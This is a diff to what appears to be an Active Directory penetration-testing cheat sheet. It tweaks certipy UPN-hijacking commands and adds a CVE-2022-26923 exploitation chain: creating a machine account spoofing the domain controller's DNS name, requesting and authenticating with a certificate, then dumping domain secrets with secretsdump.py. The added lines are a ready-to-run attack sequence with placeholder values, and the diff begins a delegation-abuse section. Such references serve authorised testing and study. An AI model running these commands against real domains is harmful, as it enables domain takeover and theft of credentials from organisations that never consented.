@@ -166,9 +166,14 @@
             *   `certipy-ad auth -pfx [PFX_FILE] -dc-ip [DC_IP]`
         *   UPN Hijacking
             *   `certipy-ad account update [AUTH_STRING] -user [VULN_USER] -upn "Administrator" -dc-ip [DC_IP]`
-            *   `certipy-ad req [VULN_USER_AUTH_STRING] -target [DC_IP] -ca [CA_NAME] -template [TEMPLATE] -dc-ip [DC_IP]`
+            *   `certipy-ad req  [TARGET_AUTH_STRING] -target [DC_IP] -ca [CA_NAME] -template [TEMPLATE] -dc-ip [DC_IP]`
             *   `certipy-ad account update [AUTH_STRING] -user [VULN_USER] -upn "[VULN_USER]@[DOMAIN]" -dc-ip [DC_IP]`
-            *   `certipy-ad auth -pfx [PFX_FILE] -domain [DOMAIN] -dc-ip [DC_IP]`
+            *   `certipy-ad auth -pfx      [PFX_FILE] -domain [DOMAIN] -dc-ip [DC_IP]`
+        *   CVE-2022-26923
+            *   `certipy account create [AUTH_STRING] -user [USER_TO_CREATE] -dns [DC_FQDN] -dc-ip [DC_IP]`
+            *   `certipy req            [AUTH_STRING] -ca   [CA_NAME] -template [TEMPLATE]`
+            *   `certipy auth -pfx      [OUTPUT.pfx] -dc-ip [DC_IP]`
+            *   `secretsdump.py         [DOMAIN]/[DC_COMPUTER_NAME] -hashes [DC_COMPUTER_HASH]`
     *   [Delegation Abuse](https://www.thehacker.recipes/ad/movement/kerberos/delegations/)
         *   Unconstrained
             *   `nxc ldap [DC_IP] [AUTH_STRING] --trusted-for-delegation`
